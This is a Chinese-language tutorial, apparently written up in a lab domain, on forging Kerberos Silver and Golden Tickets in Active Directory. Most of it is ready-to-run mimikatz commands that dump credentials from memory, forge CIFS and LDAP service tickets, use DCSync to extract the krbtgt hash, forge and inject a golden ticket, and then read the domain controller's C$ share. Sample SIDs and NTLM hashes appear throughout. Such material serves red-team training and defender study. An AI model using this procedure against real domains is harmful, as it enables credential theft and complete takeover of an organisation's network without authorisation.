1、白银票据

1.1 简介

白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。如下图所示，与域控制器没有AS-REQ 和 AS-REP（步骤1和2），也没有TGS-REQ / TGS-REP（步骤3和4）通信。由于银票是伪造的TGS，所以没有与域控制器通信。

1.2 利用条件

1.基本条件

1.域名称
2.域的SID值
3.域中的Server服务器账户的NTLM-Hash
4.伪造的用户名，可以是任意用户名
5.目标服务器上面的kerberos服务

2.白银票据服务列表

1.3 利用方式

1.获取信息

1.查看域成员SID信息

whoami /user

SID信息：S-1-5-21-3864002930-708215365-3478260457-1604

2.查看当前域

net time /domain

当前域为：seclabs.com

3.获取域内服务NTLM HASH

这里以AD域控的共享服务为例，使用mimikatz以管理员身份运行获取信息

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit">log.txt

获取AD服务的NTLM：f8933d38ff329ab9bc0be4c2ce258004

2.伪造白银票据-CIFS共享

1.清除本地票据

白银票据利用条件已全部满足。开始实施伪造TGS前，为避免干扰，先将Client(Windows Server 2008、域成员)上的本地票据清除。

使用mimikatz清除

mimikatz kerberos::purge
mimikatz kerberos::list

或者使用系统命令清除

klist purge
klist

2.尝试访问AD服务

未创建票据前访问不成功

shell dir \\DC.seclabs.com\c$

3.创建访问AD的CIFS服务票据

/domain：# 当前域名称
/sid：# 注意是去掉最后一个-后面的值
/target：# 目标主机，这里是DC.seclabs.com
/service：# 服务名称，这里需要访问共享文件，所以是cifs
/rc4：# 目标主机的HASH值
/user：# 伪造的用户名
/ptt：# 表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
mimikatz kerberos::golden /domain:seclabs.com /sid:S-1-5-21-3864002930-708215365-3478260457 /target:DC.seclabs.com /service:cifs /rc4:f8933d38ff329ab9bc0be4c2ce258004 /user:silver /ptt

4.访问DC的CIFS服务

shell dir \\DC.seclabs.com\c$

3.伪造白银票据-LADP服务权限

使用 dcsync 从域控制器中获取指定用户的账号和密码哈希值，例如 krbtgt。

1.测试访问krbtgt

查看当前权限是否可以使用 dcsync 与与控制器进行同步

lsadump::dcsync /dc:域DC /domain:域名 /user:域用户名
mimikatz lsadump::dcsync /dc:DC.seclabs.com /domain:seclabs.com /user:krbtgt

当前权限不能进行 dcsync 操作

2.获取服务账号的 NTLM Hash

3.获取域用户SID

4.清除所有票据

mimikatz kerberos::purge

5.创建访问AD的LDAP服务票据

mimikatz kerberos::golden /domain:seclabs.com /sid:S-1-5-21-3864002930-708215365-3478260457 /target:DC.seclabs.com /service:LDAP /rc4:f8933d38ff329ab9bc0be4c2ce258004 /user:silver /ptt

6.查询AD中krbtgt的HASH

mimikatz lsadump::dcsync /dc:DC.seclabs.com /domain:seclabs.com /user:krbtgt

2、黄金票据

2.1 简介

Golden Ticket（金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。

每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。

如下图所示，与域控制器没有AS-REQ或AS-REP（步骤1和2）通信。由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到域控制器以获得服务票据。

2.2 利用条件

1、域名称            
2、域的SID值
3、域的KRBTGT账户密码HASH
4、伪造用户名，可以是任意的

2.3 利用方法

1.获取基本信息

1.域名称获取

shell net time /domain

2.域SID值获取

shell whoami /user

域SID:S-1-5-21-3864002930-708215365-3478260457,需要去除最后-后面内容

3.KRBTGT账户HASH

mimikatz lsadump::dcsync /domain:seclabs.com /user:krbtgt

KRBTGT账号HASH:6434d17dfe0a2500d75df35358668da1

2.创建黄金票据

1.创建黄金票据

mimikatz kerberos::golden /admin:administrator /domain:seclabs.com /sid:S-1-5-21-3864002930-708215365-3478260457 /krbtgt:6434d17dfe0a2500d75df35358668da1 /ticket:golden.kiribi

2.导入伪造Golden Ticket

通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中

mimikatz kerberos::purge                 # 清除所有票据
mimikatz kerberos::ptt golden.kiribi     # 导入生成的黄金票据
mimikatz kerberos::list                  # 查看导入的票据

3.访问AD域控目录

shell dir \\DC.seclabs.com\c$
